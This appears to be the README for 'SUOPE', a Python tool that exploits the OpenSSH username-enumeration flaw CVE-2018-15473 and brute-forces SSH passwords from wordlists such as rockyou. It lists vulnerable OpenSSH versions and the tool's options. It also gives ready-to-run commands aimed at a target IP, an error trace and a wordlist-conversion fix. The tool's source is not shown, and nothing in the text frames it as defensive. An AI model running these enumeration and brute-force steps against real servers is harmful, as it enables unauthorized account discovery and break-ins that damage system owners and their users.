# SUOPE - SSH USER OR PASSWORD ENUMERATION by angry-bender
     
                )     (    )                      SSH User or Password Enmeration  
                 )     )  ( 
                  )    )   (         ,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
               _.(--'('''--)._      I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
              /, _..-----).._,\      `"Y8ba,  88       88 8b       d8 88       d8 8PP"
             |  `'''-----'''`  |    aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
              \               /     `"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
               '.           .'                                        88               
                 '--.....--'                                          88 
                                                             V1.0.5
                                                ASCII Art Credit ascii.co.uk
                                                
## Description
Exploits CVE-2018-15473 and runs a fuzzing test from a list of passwords, like the rockyou database

## Requirements
1. Python 3
     - pip
          - paramiko
          - cryptography==2.4.2
          - colorama

2. A Vulnerable SSH Box with;
     - OpenSSH 7.6 or Below or 
     - Ubuntu 16.04 LTS (Xenial Xerus):(1:7.2p2-4) - https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-15473.html

## Usage
`chmod +x suope.py`

`./suope.py -h for help`
```
usage: suope.py [-h] [--port PORT] [--suppress SUPPRESS]
                (--username USERNAME | --userfile USERFILE)
                (--password PASSWORD | --passfile PASSFILE)
                hostname

positional arguments:
  hostname             The target hostname or ip address

optional arguments:
  -h, --help           show this help message and exit
  --port PORT          The target port (Default 22)
  --suppress SUPPRESS  Suppresses unsuccessful usernames or passwords
  --username USERNAME  A Single Usename to Enumerate (Default User)
  --userfile USERFILE  The list of usernames (one per line) to enumerate
                       through
  --password PASSWORD  A Single Password to Enumerate (Default Password)
  --passfile PASSFILE  The list of passwords (one per line) to enumerate
                       through

```
### Example Use case with single username and password set
`./suope.py 192.168.56.3 --username user --passfile = /tmp/rockyou.txt`

### Supressing False inputs
With large password files, like rockyou, it could be useful to suppress the unsuccessful outputs, if this is required then you can execute the following command

`./suope.py 192.168.56.3 --userfile /tmp/userlist.txt --password pass --suppress True`

### Troubleshooting Input files

Some input files may cause an error during the runtime, as per below
```
user@exploit:~/Desktop/git$ ./suope.py 192.168.56.3 --userfile /tmp/userlist.txt --passfile ./rockyou.txt 
        
      SSH User or Password Enmeration  

,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
 `"Y8ba,  88       88 8b       d8 88       d8 8PP"
aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
`"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
                                  88           
                                  88 
                    V1.0.5
          ASCII Art Credit ascii.co.uk
                                            
Traceback (most recent call last):
  File "./suope.py", line 191, in <module>
    linepassword = [line.strip("\n") for line in open(args.passfile,'r', encoding ="utf-8")]
  File "./suope.py", line 191, in <listcomp>
    linepassword = [line.strip("\n") for line in open(args.passfile,'r', encoding ="utf-8")]
  File "/usr/lib/python3.5/codecs.py", line 321, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
user@exploit:~/Desktop/git$ 
```

to fix this, a database like rock you may need to be converted, with the following command

`iconv -f ISO-8859-1 -t UTF-8 rockyou.txt > rockyou_utf8.txt`


## Credits
Initial Exploit Code -  Justin Gardner, Penetration Tester @ SynerComm AssureIT - Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit  

Initial Password Code - Sergeant Sploit - https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/


## Licence
Copyright (c) 2019 - All Rights Reserved

Permission is not granted without the express prior written approval from the author, to any person obtaining a copy of this software and associated documentation files (the "Software"), to copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
